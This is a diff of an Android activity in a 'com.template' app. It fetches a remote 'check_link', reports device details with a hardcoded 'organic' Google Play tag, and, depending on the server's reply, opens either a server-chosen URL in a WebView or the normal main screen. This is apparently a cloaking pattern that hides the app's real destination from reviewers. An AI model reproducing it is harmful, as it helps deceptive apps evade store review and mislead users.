@@ -1,13 +1,18 @@
 package com.template;
 
+import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.util.Log;
 import android.webkit.WebView;
 
+import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
@@ -25,6 +30,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.Charset;
 import java.util.TimeZone;
+import java.util.UUID;
 import java.util.concurrent.ExecutionException;
 
 public class MyInitialActivity extends AppCompatActivity {
@@ -37,68 +43,78 @@ public class MyInitialActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-
-        Log.d("Launch firebase","ok");
         //FireBase init
+
         FirebaseApp.initializeApp(this);
         firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
         FirebaseRemoteConfigSettings firebaseRemoteConfigSettings = new FirebaseRemoteConfigSettings.Builder()
                 .setMinimumFetchIntervalInSeconds(10)
                 .build();
         firebaseRemoteConfig.setConfigSettingsAsync(firebaseRemoteConfigSettings);
-        initFromDataBase();
-        Log.d("OneSignal launch","ok");
-        //OneSignal API init
-        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
-        OneSignal.initWithContext(this);
-        OneSignal.setAppId(ONESIGNAL_APP_ID);
 
-
-
-        uuid = OneSignal.getDeviceState().getUserId();
-        Log.d("User id",uuid+" fali");
-        if(uuid == null) {
-            try {
-                Log.d("Tages","First init");
-                firstInit();
-            } catch (IOException | ExecutionException | InterruptedException | JSONException e) {
-                e.printStackTrace();
+        firebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
+            @Override
+            public void onComplete(@NonNull Task<Boolean> task) {
+                if(task.isSuccessful()){
+                cont();}else{cont();}
             }
-            return;
-        }
-        AsyncGetTags agt = new AsyncGetTags();
-        agt.start();
-        while(agt.getStatus()){}
-        String tag = agt.getResult();
+        });
 
-        Log.d("Tages", tag+"");
-
-        if(tag.equals("Error")){
-            openMain();
-            return;
-        }
-        openWeb(tag);
     }
+    private void cont(){
+            Log.d("Firebases", "continue");
+
+
+            //OneSignal API init
+            OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
+            OneSignal.initWithContext(this);
+            OneSignal.setAppId(ONESIGNAL_APP_ID);
+
+            uuid = OneSignal.getDeviceState().getUserId();
+            Log.d("uuidd",uuid+"");
+            if(uuid == null) {
+                try {
+                    firstInit();
+                } catch (IOException | ExecutionException | InterruptedException | JSONException e) {
+                    e.printStackTrace();
+                }
+                return;
+            }
+            AsyncGetTags agt = new AsyncGetTags();
+            agt.start();
+            while(agt.getStatus()){}
+            String tag = agt.getResult();
+
+            if(tag.equals("Error")){
+                openMain();
+                return;
+            }
+            openWeb(tag);
+        }
+
 
     private void firstInit() throws IOException, ExecutionException, InterruptedException, JSONException {
         //params for url
+        uuid = UUID.randomUUID().toString();
+        OneSignal.setExternalUserId(uuid);
         String checkLink = firebaseRemoteConfig.getString("check_link");
+        if(checkLink.isEmpty()){
+            failInit();
+            return;
+        }
+        Log.d("Check_link", checkLink+"");
         String packID = this.getPackageName();
         TimeZone tz = TimeZone.getDefault();
         Log.d("Timezone",tz.getID());
         String tail = "&getr=utm_source=google-play&utm_medium=organic";
         String url = checkLink+"/?packageid="+packID+"&usserid="+uuid+"&getz="+tz.getID()+tail;
-        //Async
-        Log.d("Tages",url);
-
         String userAgent = new WebView(this).getSettings().getUserAgentString();
 
+        //Async
         AsyncReq ar = new AsyncReq();
         ar.execute(url,userAgent);
         String response = ar.get();
-
-        //Log.d()
-
+        Log.d("response",response);
         if(response.equals("error")){
             failInit();
         }else{
@@ -108,12 +124,16 @@ public class MyInitialActivity extends AppCompatActivity {
 
     }
 
+
     private void successInit(String url) {
+
+        Log.d("InitProg","success");
         OneSignal.sendTag("PRIMER_URL",url);
         openWeb(url);
 
     }
     private void failInit(){
+        Log.d("InitProg","fail");
         OneSignal.sendTag("PRIMER_URL","Error");
         openMain();
     }
@@ -133,23 +153,14 @@ public class MyInitialActivity extends AppCompatActivity {
         finish();
     }
 
-    private void initFromDataBase() {
-        firebaseRemoteConfig.fetchAndActivate()
-                .addOnCompleteListener(this, task -> {
-                    if (task.isSuccessful()) {
-                        Log.d("Firebases", "Okey");
-                    } else {
-                        Log.d("Firebases", "Massive comic errror");
-                    }
-                });
-    }
+
 }
 
 class AsyncReq extends AsyncTask<String, Integer, String> {
 
     @Override
     protected String doInBackground(String... strings) {
-        Log.d("Sending req",strings[0]);
+        Log.d("Firebases",strings[0]);
         int statusCode = 403;
         try{
             URL url = new URL(strings[0]);
@@ -224,4 +235,37 @@ class AsyncGetTags extends Thread{
         return this.result;
     }
 
+}
+class AsyncInitFromDB extends Thread{
+
+    private boolean status=true;
+    private FirebaseRemoteConfig conf;
+    private Activity context;
+
+    public void setConf(FirebaseRemoteConfig conf, Activity context) {
+        this.conf = conf;
+        this.context = context;
+    }
+
+    @Override
+    public void run() {
+        conf.fetchAndActivate()
+                .addOnCompleteListener(context,task -> {
+                    if (task.isSuccessful()) {
+                        Log.d("Firebases", "Okey");
+                    } else {
+                        Log.d("Firebases", "Massive comic errror");
+                    }
+                    setStatus(false);
+                });
+    }
+
+    public boolean getStatus(){
+        return this.status;
+    }
+
+    private void setStatus(boolean status) {
+        Log.d("Statet", "sec");
+        this.status = status;
+    }
 }
